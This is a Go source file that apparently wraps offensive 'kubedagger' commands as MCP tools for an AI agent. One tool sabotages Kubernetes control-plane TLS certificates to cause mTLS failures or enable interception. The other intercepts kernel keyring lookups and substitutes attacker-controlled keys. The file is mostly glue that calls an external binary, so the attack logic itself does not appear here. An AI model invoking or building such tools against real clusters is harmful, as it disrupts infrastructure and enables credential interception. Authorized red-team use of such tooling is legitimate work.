package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// Cert Sabotage

type CertSabotageInput struct {
	Mode       string `json:"mode,omitempty"`
	CertTarget string `json:"cert_target,omitempty"`
}

type CertSabotageTool struct {
	exec executor.Executor
}

func NewCertSabotage(exec executor.Executor) *CertSabotageTool {
	return &CertSabotageTool{exec: exec}
}

func (t *CertSabotageTool) Name() string { return "kubedagger_cert_sabotage" }

func (t *CertSabotageTool) Description() string {
	return "Sabotage TLS certificate handling for Kubernetes control plane components. Can inject rogue certificates, block certificate issuance/renewal, or force certificate expiry to cause mTLS authentication failures or enable MITM."
}

func (t *CertSabotageTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"mode": {
				"type": "string",
				"enum": ["inject", "block", "expire"],
				"description": "Certificate sabotage mode (default: expire)"
			},
			"cert_target": {
				"type": "string",
				"enum": ["kubelet", "apiserver", "etcd"],
				"description": "Control plane component whose certificates are targeted (default: kubelet)"
			}
		}
	}`)
}

func (t *CertSabotageTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CertSabotageInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	args := []string{"cert-sabotage"}
	if input.Mode != "" {
		args = append(args, "--mode", input.Mode)
	}
	if input.CertTarget != "" {
		args = append(args, "--cert-target", input.CertTarget)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger cert-sabotage failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Cert Sabotage\n\n")
	if output == "" {
		sb.WriteString("Sabotage active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// Keyring MITM

type KeyringMITMInput struct {
	TargetKeyType string `json:"target_key_type,omitempty"`
	ReplaceWith   string `json:"replace_with,omitempty"`
}

type KeyringMITMTool struct {
	exec executor.Executor
}

func NewKeyringMITM(exec executor.Executor) *KeyringMITMTool {
	return &KeyringMITMTool{exec: exec}
}

func (t *KeyringMITMTool) Name() string { return "kubedagger_keyring_mitm" }

func (t *KeyringMITMTool) Description() string {
	return "Perform MITM attacks on kernel keyring operations by intercepting key lookups and substituting attacker-controlled keys. When a target process requests a key of the given type, the replacement key material is served instead."
}

func (t *KeyringMITMTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"target_key_type": {
				"type": "string",
				"enum": ["user", "logon", "all"],
				"description": "Key type to intercept (default: user)"
			},
			"replace_with": {
				"type": "string",
				"description": "Path to file containing replacement key material"
			}
		}
	}`)
}

func (t *KeyringMITMTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input KeyringMITMInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.ReplaceWith, "replace_with"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"keyring-mitm"}
	if input.TargetKeyType != "" {
		args = append(args, "--target-key-type", input.TargetKeyType)
	}
	if input.ReplaceWith != "" {
		args = append(args, "--replace-with", input.ReplaceWith)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger keyring-mitm failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Keyring MITM\n\n")
	if output == "" {
		sb.WriteString("MITM active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
